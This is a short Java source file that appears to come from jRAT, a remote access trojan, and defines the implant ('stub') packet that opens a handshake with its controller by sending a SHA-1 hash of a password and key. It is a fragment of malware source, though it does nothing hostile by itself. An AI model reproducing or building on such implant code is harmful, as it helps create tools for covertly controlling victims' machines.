package io.jrat.stub.packets.outgoing;

import io.jrat.common.codec.Hex;
import io.jrat.common.hash.Sha1;
import io.jrat.common.io.StringWriter;
import io.jrat.stub.Main;

import java.io.DataOutputStream;

public class Packet1InitHandshake extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		Sha1 hash = new Sha1();
		
		String data = Main.getPass() + "&" + Hex.encode(Main.getKey());
		
		/* Writes 20 bytes */
		dos.write(hash.hash(data));
	}

	@Override
	public byte getPacketId() {
		return (byte) 1;
	}

}
